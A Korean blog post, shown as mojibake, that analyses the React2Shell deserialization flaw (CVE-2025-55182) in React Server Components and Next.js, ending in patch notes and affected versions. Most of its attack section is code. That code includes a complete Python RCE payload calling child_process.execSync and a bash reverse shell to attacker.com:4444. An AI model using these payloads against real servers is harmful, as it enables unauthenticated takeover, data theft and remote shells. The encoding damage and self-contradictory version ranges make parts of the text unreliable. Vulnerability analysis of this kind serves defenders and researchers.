---
title: 'React2Shell ë¶„ì„ - PRIMITIVE #2ë¶€í„° RCEê¹Œì§€ (3/3)'
author: P0LESTAR
date: 2025-12-23 00:01:01 +0800
categories: [CVE, 1-dayë¶„ì„]
tags: [CVE, CVE-2025-55182, react2shell, 1-dayë¶„ì„]
#pin: true
sitemap:
  changefreq: monthly
  priority: 0.5
---

## ê°œìš”
2025ë…„ 12ì›”ì— ë°œê²¬ëœ `RSC`(React Server Components)ì˜ `React2Shell` ì·¨ì•½ì `CVE-2025-55182`ì€ `Flight í”„ë¡œí† ì½œ` í˜ì´ë¡œë“œë¥¼ ì„œë²„ ì¸¡ì—ì„œ ì—­ì§ë ¬í™” ì‹œ ì•ˆì „í•˜ì§€ ì•Šì€ ê²€ì¦ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” RCE ì·¨ì•½ì ì…ë‹ˆë‹¤.

ì¦‰, í´ë¼ì´ì–¸íŠ¸ì—ì„œ ì„œë²„ë¡œ ë³´ë‚¸ Flight í”„ë¡œí† ì½œ í˜ì´ë¡œë“œì— ëŒ€í•œ ê²€ì¦ì´ ì™„ì „í•˜ì§€ ì•Šì•„ ë°œìƒí•œ ë¬¸ì œì…ë‹ˆë‹¤.

ì´ ê³µê²©ì— ëŒ€í•œ í•µì‹¬ ì·¨ì•½ì ì„ í¬ê²Œ ì„¸ ê°€ì§€ë¡œ êµ¬ë¶„í•  ìˆ˜ ìˆìœ¼ë©°, ì „ì²´ ê³µê²©ì€ ì„¸ ì·¨ì•½ì ì˜ ì—°ê³„ë¡œ ì™„ì„±ë©ë‹ˆë‹¤.

<br>

---

> **ì´ì „ ê¸€**: [React2Shell ì·¨ì•½ì  ë¶„ì„ Part 1 - PRIMITIVE #1](/posts/react2shell-part1)ì—ì„œ Function ìƒì„±ì ì ‘ê·¼ê¹Œì§€ ë‹¤ë¤˜ìŠµë‹ˆë‹¤.
{: .prompt-info }

## ëª©ì°¨
1. [PRIMITIVE #1 ë³µìŠµ](#primitive-1-ë³µìŠµ)
2. [PRIMITIVE #2: initializeModelChunk ê°•ì œ í˜¸ì¶œ](#primitive-2-initializemodelchunk-ê°•ì œ-í˜¸ì¶œ)
3. [Call Gadget: Blob ì²˜ë¦¬ë¥¼ ì´ìš©í•œ Function ì‹¤í–‰](#call-gadget-blob-ì²˜ë¦¬ë¥¼-ì´ìš©í•œ-function-ì‹¤í–‰)
4. [ìµœì¢… RCE í˜ì´ë¡œë“œ](#ìµœì¢…-rce-í˜ì´ë¡œë“œ)
5. [ì „ì²´ ê³µê²© íë¦„ ì •ë¦¬](#ì „ì²´-ê³µê²©-íë¦„-ì •ë¦¬)

---

## PRIMITIVE #1 ë³µìŠµ

[Part 1](/posts/react2shell-part1)ì—ì„œ ìš°ë¦¬ëŠ” Prototype Pollutionì„ í†µí•´ Function ìƒì„±ìì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.

```javascript
files = {
    "0": '["$1:__proto__:constructor:constructor"]',
    "1": '{"x":1}'
}

// ì—­ì§ë ¬í™” ê²°ê³¼
[Function: Function]
```

### ì ‘ê·¼ ê²½ë¡œ

```javascript
let value = { x: 1 };                // Chunk 1
value = value["__proto__"];          // Object.prototype
value = value["constructor"];        // [Function: Object]
value = value["constructor"];        // [Function: Function] ğŸ’€
```

### PRIMITIVE #1ì˜ í•œê³„

- âœ… Function ìƒì„±ìì— **ì ‘ê·¼ ê°€ëŠ¥**
- âŒ Functionì„ **ì‹¤ì œë¡œ ì‹¤í–‰í•˜ì§€ëŠ” ëª»í•¨**
- âŒ ë‹¨ë…ìœ¼ë¡œëŠ” RCE ë¶ˆê°€ëŠ¥

**ì´ì œ Functionì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë´…ì‹œë‹¤.**

---

## PRIMITIVE #2: initializeModelChunk ê°•ì œ í˜¸ì¶œ

### ëª©í‘œ

Function ìƒì„±ìë¥¼ **ì‹¤í–‰**ì‹œì¼œì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ë™ì‘ì‹œí‚¤ê¸°

### initializeModelChunk í•¨ìˆ˜ ì—­í• 

```javascript
function initializeModelChunk(chunk) {
  // 1. chunk.value (ë¬¸ìì—´)ì„ JSONìœ¼ë¡œ íŒŒì‹±
  const model = JSON.parse(chunk.value);
  
  // 2. íŒŒì‹±ëœ ëª¨ë¸ì„ í•´ì„í•´ì„œ ì‹¤ì œ ê°’ìœ¼ë¡œ ë³€í™˜
  chunk.value = resolveModelChunk(chunk, model);
  
  // 3. ìƒíƒœ ë³€ê²½
  chunk.status = INITIALIZED;
}
```

ì´ í•¨ìˆ˜ëŠ” Chunkë¥¼ "í™œì„±í™”"ì‹œí‚¤ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. Flight Protocolì˜ íŠ¹ìˆ˜ ê¸°í˜¸ë“¤(`$@`, `$F`, `$B` ë“±)ì„ í•´ì„í•˜ì—¬ ì‹¤ì œ JavaScript ê°’ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

### Chunk.prototype.thenê³¼ì˜ ê´€ê³„

```javascript
Chunk.prototype.then = function(resolve, reject) {
  const chunk = this;
  
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);  // â­ ì—¬ê¸°ì„œ í˜¸ì¶œ
      break;
    case INITIALIZED:
      resolve(chunk.value);
      break;
    // ...
  }
}
```

**í•µì‹¬:** `status`ê°€ `RESOLVED_MODEL`ì´ë©´ `initializeModelChunk()`ê°€ ìë™ìœ¼ë¡œ í˜¸ì¶œë©ë‹ˆë‹¤.

### ê³µê²© ì•„ì´ë””ì–´

1. ê°€ì§œ Chunk ê°ì²´ë¥¼ ë§Œë“¤ì–´ì„œ
2. `then` ì†ì„±ì„ `Chunk.prototype.then`ìœ¼ë¡œ ì„¤ì •í•˜ê³ 
3. `status`ë¥¼ `"resolved_model"`ë¡œ ì„¤ì •í•˜ë©´
4. `await` ì‹œ `initializeModelChunk()`ê°€ ìš°ë¦¬ê°€ ì¡°ì‘í•œ ë°ì´í„°ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤

---

## ìê¸° ì°¸ì¡° íŠ¸ë¦­: `$@0`

### ë¬¸ì œ

ì–´ë–»ê²Œ Chunk 0ì´ ìê¸° ìì‹ ì˜ `Chunk.prototype.then`ì„ ì°¸ì¡°í•  ìˆ˜ ìˆì„ê¹Œ?

### í•´ê²°: Raw Chunk Reference

Flight Protocolì˜ `$@` êµ¬ë¬¸ì€ **Promise/Chunkë¥¼ "raw" í˜•íƒœë¡œ** ë°˜í™˜í•©ë‹ˆë‹¤.

```javascript
case "@":
  return (
    (obj = parseInt(value.slice(2), 16)), 
    getChunk(response, obj)
  );
```

ì´ë¥¼ ì´ìš©í•˜ë©´ Chunk 0ì´ **ìê¸° ìì‹ ì˜ raw chunk**ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

### ê³µê²© í˜ì´ë¡œë“œ

```javascript
files = {
    "0": '{"then": "$1:__proto__:then"}',
    "1": '"$@0"'  // Chunk 0 ìì‹ ì„ rawë¡œ ì°¸ì¡°
}
```

### ì‹¤í–‰ ê³¼ì •

```javascript
// 1. Chunk 0 íŒŒì‹±
{
  then: "$1:__proto__:then"  // Chunk 1ì˜ __proto__ì˜ then
}

// 2. Chunk 1 íŒŒì‹±
"$@0"  // Chunk 0ì˜ raw í˜•íƒœ (Promise ê°ì²´)

// 3. Chunk 0ì˜ then í•´ì„
// ê²½ë¡œ: $1 â†’ (Chunk 0ì˜ raw) â†’ __proto__ â†’ then
Chunk0.__proto__.then
// = Chunk.prototype.then ğŸ’€
```

ê²°ê³¼ì ìœ¼ë¡œ **Chunk 0ì˜ then ë©”ì„œë“œê°€ Chunk.prototype.thenì´ ë©ë‹ˆë‹¤**

---

## status ì„¤ì •ìœ¼ë¡œ ì½”ë“œ ê²½ë¡œ ì œì–´

```javascript
files = {
    "0": '{
        "then": "$1:__proto__:then",
        "status": "resolved_model"  // â­
    }',
    "1": '"$@0"'
}
```

### await ì‹œ ë™ì‘

```javascript
// Next.js ë‚´ë¶€
await chunk0;

// ë‚´ë¶€ì ìœ¼ë¡œ ì‹¤í–‰ë¨
chunk0.then(resolve, reject);

// Chunk.prototype.thenì´ í˜¸ì¶œë¨
Chunk.prototype.then.call(chunk0, resolve, reject);

// í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ
switch (chunk0.status) {  // "resolved_model"
  case RESOLVED_MODEL:
    initializeModelChunk(chunk0);  // ğŸ’€ í˜¸ì¶œ
    break;
}
```

ì´ì œ `initializeModelChunk()`ê°€ **ìš°ë¦¬ê°€ ì¡°ì‘í•œ chunk0**ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤

---

## Call Gadget: Blob ì²˜ë¦¬ë¥¼ ì´ìš©í•œ Function ì‹¤í–‰

### ë¬¸ì œ

`initializeModelChunk()`ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆê²Œ ëì§€ë§Œ, ì—¬ì „íˆ **Functionì„ ì‹¤ì œë¡œ ì‹¤í–‰**í•´ì•¼ í•©ë‹ˆë‹¤.

### í•´ê²°: `$B` Blob ì²˜ë¦¬ ì½”ë“œ

Flight Protocolì—ëŠ” Blob ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ëŠ” ì½”ë“œê°€ ìˆìŠµë‹ˆë‹¤

```javascript
case "B":
  return (
    (obj = parseInt(value.slice(2), 16)),
    response._formData.get(response._prefix + obj)
  );
```

- `response._formData.get()`ì´ í˜¸ì¶œë¨
- `response._prefix`ì™€ `obj`ê°€ ì—°ê²°ë˜ì–´ ì¸ìë¡œ ì „ë‹¬ë¨

### ê³µê²© í˜ì´ë¡œë“œ êµ¬ì„±

```javascript
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "value": '{"then": "$B0"}',  // Blob ì°¸ì¡°
    "_response": {
        "_prefix": "return 1+1; // ",  // ì‹¤í–‰í•  ì½”ë“œ
        "_formData": {
            "get": "$1:constructor:constructor",  // Function ìƒì„±ì
        },
    },
}
```

### ì‹¤í–‰ íë¦„

```javascript
// 1. initializeModelChunk(crafted_chunk) í˜¸ì¶œ
const model = JSON.parse(crafted_chunk.value);
// model = { then: "$B0" }

// 2. $B0 í•´ì„ ì‹œ Blob ì²˜ë¦¬ ì½”ë“œ ì‹¤í–‰
response._formData.get(response._prefix + "0")

// 3. ì‹¤ì œë¡œ ì¹˜í™˜ë˜ë©´
Function("return 1+1; // 0")

// 4. Function ìƒì„±ì í˜¸ì¶œ ğŸ’€
```

**íŠ¸ë¦­ ì„¤ëª…:**
- `_formData.get`ì„ **Function ìƒì„±ìë¡œ ì„¤ì •**
- `_prefix`ì— **ì‹¤í–‰í•  JavaScript ì½”ë“œ** ì‚½ì…
- `+ "0"`ì€ ì£¼ì„ ì²˜ë¦¬ë˜ì–´ ë¬´ì‹œë¨ (`// 0`)

---

## reason: -1 íŠ¸ë¦­

### ì¶”ê°€ ë¬¸ì œ

`initializeModelChunk` ë‚´ë¶€ì—ëŠ” ì´ëŸ° ì½”ë“œ:

```javascript
var rootReference = 
  -1 === chunk.reason 
    ? void 0 
    : chunk.reason.toString(16);
```

`reason`ì´ -1ì´ ì•„ë‹ˆë©´ `toString(16)`ì´ í˜¸ì¶œë©ë‹ˆë‹¤.

### í•´ê²°

```javascript
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,  // toString í˜¸ì¶œ ìš°íšŒ
    "value": '{"then": "$B0"}',
    // ...
}
```

`reason: -1`ì„ ì„¤ì •í•˜ë©´ `void 0` (undefined)ê°€ ë°˜í™˜ë˜ì–´ ì—ëŸ¬ë¥¼ í”¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

---

## ìµœì¢… RCE í˜ì´ë¡œë“œ

### ì™„ì „í•œ ê³µê²© ì½”ë“œ

```python
import json

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": "process.mainModule.require('child_process').execSync('calc');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}
```

### ì‹¤í–‰ë˜ëŠ” ì½”ë“œ

```javascript
// ìµœì¢…ì ìœ¼ë¡œ ì´ê²Œ ì‹¤í–‰ë¨
Function("process.mainModule.require('child_process').execSync('calc');")()

// Windowsì—ì„œ ê³„ì‚°ê¸°(calc) ì‹¤í–‰
```

### Linux/Mac í˜ì´ë¡œë“œ

```python
"_prefix": "process.mainModule.require('child_process').execSync('whoami').toString();",
```

### ë¦¬ë²„ìŠ¤ ì…¸ í˜ì´ë¡œë“œ

```python
"_prefix": "process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"');",
```

---

## ì „ì²´ ê³µê²© íë¦„ ì •ë¦¬

### ë‹¨ê³„ë³„ ë‹¤ì´ì–´ê·¸ë¨

```
[1ë‹¨ê³„] ê³µê²©ìê°€ ì¡°ì‘ëœ í˜ì´ë¡œë“œ ì „ì†¡
   â†“
[2ë‹¨ê³„] Next.jsê°€ decodeReplyFromBusboy() í˜¸ì¶œ
   â†“
[3ë‹¨ê³„] Chunk 0 íŒŒì‹±
{
  then: "$1:__proto__:then",
  status: "resolved_model",
  reason: -1,
  value: '{"then": "$B0"}',
  _response: { ... }
}
   â†“
[4ë‹¨ê³„] then ê°’ í•´ì„
â†’ Chunk.prototype.then
   â†“
[5ë‹¨ê³„] awaitë¡œ ì¸í•´ then() í˜¸ì¶œ
   â†“
[6ë‹¨ê³„] Chunk.prototype.then ì‹¤í–‰
   â†“
[7ë‹¨ê³„] status í™•ì¸: "resolved_model"
â†’ initializeModelChunk(chunk0) í˜¸ì¶œ
   â†“
[8ë‹¨ê³„] chunk0.value íŒŒì‹±
JSON.parse('{"then": "$B0"}')
â†’ { then: "$B0" }
   â†“
[9ë‹¨ê³„] $B0 í•´ì„
response._formData.get(response._prefix + "0")
   â†“
[10ë‹¨ê³„] ì‹¤ì œ í˜¸ì¶œ
Function("ì•…ì˜ì ì¸ì½”ë“œ;")
   â†“
[11ë‹¨ê³„] ì´ í•¨ìˆ˜ê°€ thenìœ¼ë¡œ ë°˜í™˜ë¨
   â†“
[12ë‹¨ê³„] awaitë¡œ ì¸í•´ í•¨ìˆ˜ê°€ ì‹¤í–‰ë¨
   â†“
[13ë‹¨ê³„] ğŸ’€ RCE
```

### ì½”ë“œë¡œ í‘œí˜„í•œ íë¦„

```javascript
// 1. await ì‹œì‘
await chunk0;

// 2. then í˜¸ì¶œ
chunk0.then(resolve, reject);
// = Chunk.prototype.then.call(chunk0, resolve, reject);

// 3. Chunk.prototype.then ë‚´ë¶€
switch (chunk0.status) {  // "resolved_model"
  case RESOLVED_MODEL:
    initializeModelChunk(chunk0);
}

// 4. initializeModelChunk ë‚´ë¶€
const model = JSON.parse(chunk0.value);
// model = { then: "$B0" }

chunk0.value = resolveModelChunk(chunk0, model);

// 5. resolveModelChunk ë‚´ë¶€ì—ì„œ $B0 ì²˜ë¦¬
case "B":
  return chunk0._response._formData.get(
    chunk0._response._prefix + "0"
  );

// 6. ì‹¤ì œ ì‹¤í–‰
Function("process.mainModule.require('child_process').execSync('calc');")

// 7. ì´ í•¨ìˆ˜ê°€ ë°˜í™˜ë˜ì–´ chunk0.value.thenì´ ë¨
chunk0.value = {
  then: Function("...")
}

// 8. awaitê°€ ë‹¤ì‹œ ì´ thenì„ í˜¸ì¶œ
chunk0.value.then(resolve, reject);

// 9. Functionì´ resolve, rejectì™€ í•¨ê»˜ í˜¸ì¶œë¨
Function("process.mainModule.require('child_process').execSync('calc');")(resolve, reject);

// 10. ğŸ’€ ì„ì˜ì˜ ì½”ë“œ ì‹¤í–‰
```

---

## ì™œ ì´ ì·¨ì•½ì ì´ ìœ„í—˜í•œê°€

### 1. ì•¡ì…˜ ê²€ì¦ ì „ì— ì‹¤í–‰ë¨

```javascript
// Next.js action-handler.ts
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
// â¬†ï¸ ì—¬ê¸°ì„œ RCE ë°œìƒ

// â¬‡ï¸ ì´ ê²€ì¦ì€ ë„ë‹¬í•˜ì§€ë„ ëª»í•¨
getActionModIdOrError(actionId);
```

**ì¦‰, ìœ íš¨í•œ ì•¡ì…˜ì´ ì—†ì–´ë„ ê³µê²© ê°€ëŠ¥í•©ë‹ˆë‹¤**

ë‹¨ìˆœíˆ `Next-Action: foo` í—¤ë”ë§Œ ë³´ë‚´ë©´ ë©ë‹ˆë‹¤.

### 2. ì¸ì¦ ë¶ˆí•„ìš”

Server Functionsì˜ ì—­ì§ë ¬í™” ê³¼ì •ì—ì„œ ë°œìƒí•˜ë¯€ë¡œ:
- ë¡œê·¸ì¸ ë¶ˆí•„ìš”
- ê¶Œí•œ ê²€ì‚¬ ìš°íšŒ
- ì–´ë–¤ ì—”ë“œí¬ì¸íŠ¸ë“  ê³µê²© ê°€ëŠ¥

### 3. ì™„ì „í•œ ì„œë²„ ì¥ì•…

Function ìƒì„±ìë¥¼ ì–»ìœ¼ë©´:
- íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼
- í™˜ê²½ ë³€ìˆ˜ íƒˆì·¨
- ë°ì´í„°ë² ì´ìŠ¤ ì ‘ê·¼
- ë¦¬ë²„ìŠ¤ ì…¸ ì—°ê²°
- ì„ì˜ì˜ ëª…ë ¹ ì‹¤í–‰

---

## íŒ¨ì¹˜ ë‚´ìš©

### ì·¨ì•½ì  ìˆ˜ì •

```javascript
// íŒ¨ì¹˜ ì „
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  return moduleExports[metadata[NAME]];  // âŒ ê²€ì‚¬ ì—†ìŒ
}

// íŒ¨ì¹˜ í›„
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  if (hasOwnProperty.call(moduleExports, metadata[NAME])) {  // âœ… ê²€ì‚¬ ì¶”ê°€
    return moduleExports[metadata[NAME]];
  }
  return (undefined: any);
}
```

### íŒ¨ì¹˜ ì›ë¦¬

`hasOwnProperty` ì²´í¬ë¥¼ ì¶”ê°€í•˜ì—¬:
- ê°ì²´ê°€ **ì§ì ‘ ê°€ì§„ ì†ì„±**ë§Œ ì ‘ê·¼ í—ˆìš©
- `__proto__`, `constructor` ê°™ì€ í”„ë¡œí† íƒ€ì… ì²´ì¸ ì†ì„± ì°¨ë‹¨

```javascript
const obj = { x: 1 };

obj.hasOwnProperty('x');           // true âœ…
obj.hasOwnProperty('__proto__');   // false âŒ
obj.hasOwnProperty('constructor'); // false âŒ
```

---

## ì˜í–¥ë°›ëŠ” ë²„ì „

### React
- 19.0.0 ì´ìƒ 19.0.0-rc-02c0e824-20241028 ë¯¸ë§Œ
- 18.3.0 ì´ìƒ 18.3.1 ë¯¸ë§Œ

### Next.js
- Next.js 15.x
- Next.js 16.x
- Next.js 14.3.0-canary.77 ë° ì´í›„ canary ë¦´ë¦¬ìŠ¤

### ê¶Œì¥ ì¡°ì¹˜ - **ì¦‰ì‹œ ì—…ë°ì´íŠ¸**

   - React 19.0.0-rc-02c0e824-20241028 ì´ìƒ
   - Next.js 15.1.1-canary.3 ì´ìƒ


---

## ì°¸ê³  ìë£Œ

<https://velog.io/@xxziiko/RSC>

<https://mycodings.fly.dev/blog/2025-01-20-rsc-tutorial-1-react-server-components-explained/>

<https://github.com/msanft/CVE-2025-55182>

<https://www.enki.co.kr/media-center/blog/complete-analysis-of-the-react2shell-cve-2025-55182-vulnerability>

<https://asec.ahnlab.com/ko/91660/>

<https://www.trendmicro.com/ko_kr/research/25/l/CVE-2025-55182-analysis-poc-itw.html>
